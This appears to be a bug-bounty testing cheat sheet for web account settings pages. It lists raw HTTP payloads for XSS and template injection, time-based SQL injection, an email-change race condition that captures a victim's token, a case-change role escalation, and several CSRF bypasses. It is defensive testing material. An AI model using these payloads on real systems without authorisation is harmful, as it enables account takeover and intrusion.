##### Null Payload Everywhere to get weird response
````
POST /settings

email, user, pass, or phone=NULL&token=csrf
````
##### Injecting XSS, SSTI payload in username or name field
````
POST /settings

username='''><svg/onload=prompt('xss');>{{7*7}}&token=csrf
    OR 
   only ssti payload in username
 username={{7*7}}
 
````
##### SQLI payload in Username field
````
POST /settings

username=' or sleep(20)'&token=csrf
````
##### If there is email change function and if the token is sent to the email for verification, try race coniditon. The application may send the same token to your email for another email
```
Post /change-email                    Post /change-email 
email=attacker@gmail.com              email=victim@gmail.com    ==> attacker will receive token for victim email.

Check james kettle samashing race condition blog on portswigger. 
```
##### If there is option to add second email, add with company email
````
POST /settings

email= any@company.com&action=add

email=samsec@gmail.com@company.com
email=any@burpcollaborator.net

````
##### CASE SENSITIVE IDORS [If Role change option is there and using admin throw no permission, try chaning case of admin to (Admin)]
````
POST /user/changeroles

{"id"=10,"role"="admin"}               response: {"error":"no_permission"}


change to 
{"id"=10,"role"="Admin"}                response: {"status":"OK"}
````
---------------------------------------------------------------------------------------------
#### - Try to remove CSRF token from the request and check if it works. And generate burp csrf POC
--------------------------------------------------------------------------------------------
##### Send empty token array in csrf token parameter
````
POST /settings

email=me@gmail.com&token[]=
````
##### Bypassing CSRF by changing request method from POST to GET
````
GET /settings?----------
--
--
--
````
